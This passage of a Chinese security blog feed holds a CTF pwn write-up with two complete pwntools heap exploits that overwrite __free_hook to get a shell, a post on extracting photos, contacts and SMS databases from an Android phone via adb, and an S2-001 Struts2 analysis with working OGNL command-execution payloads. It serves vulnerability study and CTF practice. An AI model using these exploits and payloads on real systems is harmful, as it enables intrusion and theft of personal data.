  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>



<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x4</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  rm<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">-</span>i<span class="token punctuation">)</span>

rm<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>



<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>

view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
ma_a<span class="token operator">=</span>int<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ma_a<span class="token punctuation">)</span><span class="token punctuation">)</span>
ma_o<span class="token operator">=</span><span class="token number">0x3ebc40</span>
lib_b<span class="token operator">=</span>ma_a<span class="token operator">-</span>ma_o
fh_a<span class="token operator">=</span>lib_b<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>fh_a<span class="token punctuation">)</span><span class="token punctuation">)</span>
sys_a<span class="token operator">=</span>lib_b<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

rm<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>cyclic<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fh_a<span class="token number">-8</span><span class="token punctuation">)</span><span class="token operator">+</span>cyclic<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>sys_a<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>

rm<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>



c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/pwn1.png" alt="图片"></p>
<h3 id="youchat【已解决】"><a href="#youchat【已解决】" class="headerlink" title="youchat【已解决】"></a>youchat【已解决】</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>



LOCAL <span class="token operator">=</span> <span class="token boolean">False</span>
binfile<span class="token operator">=</span><span class="token string">'./youchat'</span>
libcfile<span class="token operator">=</span><span class="token string">'./libc-2.27.so'</span>
offset<span class="token operator">=</span><span class="token number">0</span>



e<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binfile<span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'info'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span>e<span class="token punctuation">.</span>arch
<span class="token keyword">if</span> context<span class="token punctuation">.</span>arch<span class="token operator">==</span><span class="token string">'i386'</span><span class="token punctuation">:</span>
    x86<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    x86<span class="token operator">=</span><span class="token boolean">False</span>

<span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
    c <span class="token operator">=</span> process<span class="token punctuation">(</span>binfile<span class="token punctuation">)</span>
    <span class="token keyword">if</span> libcfile<span class="token punctuation">:</span>
        libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>libcfile<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> x86<span class="token punctuation">:</span>
            libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'124.70.158.59'</span><span class="token punctuation">,</span><span class="token number">30023</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> libcfile<span class="token punctuation">:</span>
        libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>libcfile<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>name<span class="token punctuation">,</span>pword<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'How long is your user id: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'User name: '</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Password: '</span><span class="token punctuation">,</span>pword<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'New username: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Username: '</span><span class="token punctuation">)</span>

s<span class="token operator">=</span><span class="token string">'/bin/sh;'</span>
size<span class="token operator">=</span><span class="token number">0x88</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  add<span class="token punctuation">(</span>i<span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  rm<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">-</span>i<span class="token punctuation">)</span>

rm<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>





<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  add<span class="token punctuation">(</span>i<span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
ma_a<span class="token operator">=</span>int<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'ma_a: '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ma_a<span class="token punctuation">)</span><span class="token punctuation">)</span>
ma_o<span class="token operator">=</span><span class="token number">0x3ebc40</span>
lib_b<span class="token operator">=</span>ma_a<span class="token operator">-</span>ma_o
fh_a<span class="token operator">=</span>lib_b<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'fh_a: '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>fh_a<span class="token punctuation">)</span><span class="token punctuation">)</span>
sys_a<span class="token operator">=</span>lib_b<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

offset<span class="token operator">=</span><span class="token number">0x20</span>

rm<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>cyclic<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>



rm<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fh_a<span class="token punctuation">)</span><span class="token punctuation">)</span>



add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>size<span class="token punctuation">,</span>s<span class="token punctuation">,</span>s<span class="token punctuation">)</span>



edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>sys_a<span class="token punctuation">)</span><span class="token punctuation">)</span>

rm<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>通过adb获取隐私信息</title>
    <url>/2020/12/07/tong-guo-adb-huo-qu-yin-si-xin-xi/</url>
    <content><![CDATA[<blockquote>
<p>主要测试了对于照片和通讯录、短信的一些操作，当然还有其他的攻击或信息获取方式，之后实现了再来更新总结。</p>
<p>主要是目前工作遇到问题的一些总结和记录，之后工作中再补充。</p>
</blockquote>
<h1 id="通过adb获取隐私信息"><a href="#通过adb获取隐私信息" class="headerlink" title="通过adb获取隐私信息"></a>通过adb获取隐私信息</h1><p>前提条件是手机开启了adb调试，攻击的过程都是通过adb进行的。</p>
<blockquote>
<p>测试手机是华为P9。</p>
<p>我的手机虽然root的但是没办法执行 <code>adb shell</code>，查了一下貌似有的手机是会这样，三星也常遇到。</p>
<p>解决方式有提到使用 <code>adbd Insecure</code> 来使adb shell变成root shell的，但是我的设备在使用这种方法后会adb识别不到设备，暂时没找到原因.</p>
</blockquote>
<h2 id="获取照片信息"><a href="#获取照片信息" class="headerlink" title="获取照片信息"></a>获取照片信息</h2><p>这个比较简单，主要几个点：</p>
<ul>
<li>相册目录：<code>/sdcard/DCIM</code>，一般手机拍的照片都保存在这个目录下，我的手机拍摄照片目录是：<code>/sdcard/DCIM/Camera</code></li>
<li>使用adb pull 拉取照片</li>
</ul>
<h2 id="获取联系人"><a href="#获取联系人" class="headerlink" title="获取联系人"></a>获取联系人</h2><p>联系人的信息存在一个contacts2.db的数据库中，主要是取获取该文件</p>
<ul>
<li>路径：<code>/data/data/com.android.providers.contacts/databases/contacts2.db</code></li>
<li>adb pull的时候的权限问题</li>
<li>对应的文件是个sqlite数据库，这里梳理一下获取联系人记录需要查找的几个表：contacts表、data表；</li>
<li>要先读取contacts表，name_raw_contact_id；一个name_raw_contact_id对应一个联系人，再用raw_contact_id去data表中查对应的数据</li>
</ul>
<h2 id="获取短信信息"><a href="#获取短信信息" class="headerlink" title="获取短信信息"></a>获取短信信息</h2><p>类似联系人</p>
<ul>
<li>普遍的路径是：<code>/data/data/com.android.providers.telephony/databases/mmssms.db</code></li>
<li>我测试时候的路径是：<code>/data/data/com.android.messaging/databases/bugle_db</code>，在我短信应用的包名的文件夹下</li>
<li>主要内容在 conversations 表</li>
</ul>
<h2 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h2><p>根据之前的各个表的字段关系进行修改就可以了。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/adb-attack/Screenshot_20201206-165409.png" alt=""></p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>adb</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb安全入门之 S2-001漏洞分析</title>
    <url>/2020/12/15/s2-001-lou-dong-fen-xi/</url>
    <content><![CDATA[<blockquote>
<p>跟着大佬们的博客，开始第一篇漏洞分析记录，记录漏洞复现分析过程，已经踩到的坑，开始入坑Java Web安全，补足自己的不足。</p>
</blockquote>
<h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1-漏洞简介"></a>1-漏洞简介</h2><p>官方公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<p>漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</p>
<h2 id="2-Struts2-架构-amp-请求处理流程"><a href="#2-Struts2-架构-amp-请求处理流程" class="headerlink" title="2-Struts2 架构&amp;请求处理流程"></a>2-Struts2 架构&amp;请求处理流程</h2><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077762148742.jpg" alt=""></p>
<p>在该图中，一共给出了四种颜色的标识，其对应的意义如下。</p>
<ul>
<li>Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。</li>
<li>Struts Core(浅蓝色)：Struts2的核心部分。</li>
<li>Interceptors(浅绿色)：Struts2的拦截器。</li>
<li>User created(浅黄色)：需要开发人员创建的部分。</li>
</ul>
<p>图中的一些组件的作用如下：</p>
<ul>
<li>FilterDispatcher：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。</li>
<li>ActionMapper：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。</li>
<li>ActionProxy：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。</li>
<li>ConfigurationManager：是xwork配置的管理中心，可以把它当做已经读取到内存中的struts.xml配置文件。</li>
<li>struts.xml：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。</li>
<li>ActionInvocation：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。</li>
<li>Interceptor：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。</li>
<li>Action：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。</li>
<li>Result：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。</li>
<li>Templates：各种视图类型的页面模板，比如JSP就是一种模板页面技术。</li>
<li>Tag Subsystem：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。</li>
</ul>
<p>接下来我们可以结合上图，来了解下Struts2框架是如何处理一个HTTP请求的。</p>
<p>当HTTP请求发送个Web服务器之后，Web服务器根据用户的请求以及 <code>web.xml</code> 中的配置文件，将请求转发给 <code>Struts2</code> 框架进行处理。</p>
<ol>
<li>HTTP请求经过一系列的过滤器，最后到达 <code>FilterDispatcher</code> 过滤器。</li>
<li><code>FilterDispatcher</code> 将请求转发 <code>ActionMapper</code>，判断该请求是否需要处理。</li>
<li>如果该请求需要处理，<code>FilterDispatcher</code>会创建一个 <code>ActionProxy</code> 来进行后续的处理。</li>
<li><code>ActionProxy</code> 拿着HTTP请求，询问 <code>struts.xml</code> 该调用哪一个 <code>Action</code> 进行处理。</li>
<li>当知道目标<code>Action</code>之后，实例化一个<code>ActionInvocation</code>来进行调用。</li>
<li>然后运行在<code>Action</code>之前的拦截器，图中就是拦截器1、2、3。</li>
<li>运行<code>Action</code>，生成一个<code>Result</code>。</li>
<li><code>Result</code>根据页面模板和标签库，生成要响应的内容。</li>
<li>根据响应逆序调用拦截器，然后生成最终的响应并返回给Web服务器。</li>
</ol>
<h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3-漏洞复现"></a>3-漏洞复现</h2><p>1、获取tomcat路径</p>
<pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077772939716.jpg" alt=""></p>
<p>2、获取web目录</p>
<pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077773498970.jpg" alt=""></p>
<p>3、执行命令</p>
<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077775507123.jpg" alt=""></p>
<h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4-漏洞分析"></a>4-漏洞分析</h2><h3 id="4-1-OGNL表达式"><a href="#4-1-OGNL表达式" class="headerlink" title="4.1 OGNL表达式"></a>4.1 OGNL表达式</h3><blockquote>
<p><a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">OGNL表达式注入漏洞总结–Mi1k7ea</a></p>
</blockquote>
<p>OGNL全称Object-Graph Navigation Language即对象导航图语言，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。</p>
<p><strong>OGNL三要素</strong><br>OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。</p>
<ul>
<li>表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；</li>
<li>根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；</li>
<li>上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；</li>
</ul>
<h3 id="S2-001漏洞分析"><a href="#S2-001漏洞分析" class="headerlink" title="S2-001漏洞分析"></a>S2-001漏洞分析</h3><p>先在自定义的ACtion上下个断点，然后发送带payload <code>%{1+1}</code> 的请求。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079333757203.jpg" alt="-w1555"></p>
<p>从调用栈中，我们可以看到在 <code>DefaultActionInvocation</code> 类中反射调用了我们自定义的类 <code>LoginAction</code>。<br>路径：<code>/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079336332161.jpg" alt="-w2021"></p>
<p>此时到达自定义类<code>LoginAction</code>的<code>username</code>的值为<code>%{1+1}</code>。</p>
<p>根据披露的漏洞详情可以知道，导致漏洞的原因是用户提交表单数据并且验证失败时，Struts2重新渲染jsp时后端会将用户之前提交的参数值使用ognl表达式进行递归解析然后重新填充到表单中。</p>
<p>根据最开始的struts工作流程图可以知道在一个http请求进来后，会经过一系列的 拦截器(Interceptor) ，这些拦截器可以是 Struts2 自带的，也可以是用户自定义的。例如下图 struts.xml 中的 package 继承自 struts-default ，而 struts-default 就使用了 Struts2 自带的拦截器。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079379558395.jpg" alt="-w838"></p>
<p>在 <code>struts2-core-2.0.8.jar!/struts-default.xml</code> 中可以找到默认使用的拦截器栈 <code>defaultStack</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079380574780.jpg" alt="-w1033"></p>
<p>在拦截器栈 <code>defaultStack</code> 中，我们需要关注 <code>params</code> 这个拦截器。其中， <code>params</code> 拦截器 会将客户端请求数据设置到 <code>值栈(valueStack)</code> 中<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079386300645.jpg" alt="-w1226"></p>
<p>后续 <code>JSP</code> 页面中所有的动态数据都将从值栈中取出。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079605906528.jpg" alt="-w1523"></p>
<p>这里是调试的时候进入到 <code>setParameters</code> 函数中（F7），可以喊到框中操作是把我们的输入放进了值栈<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079612927173.jpg" alt="-w1450"></p>
<p>经过一系列的拦截器处理后，数据会成功进入实际业务 Action 。程序会根据 Action 处理的结果，选择对应的 JSP 视图进行展示，并对视图中的 Struts2 标签进行处理。<br>如下图，在本例中 Action 处理用户登录失败时会返回 error 。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079620311725.jpg" alt="-w999"></p>
<p>根据返回结果以及先前在 <code>struts.xml</code> 中定义的视图：</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>struts</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>S2-001<span class="token punctuation">"</span></span> <span class="token attr-name">extends</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>struts-default<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.lanvnal.s2001.action.LoginAction<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
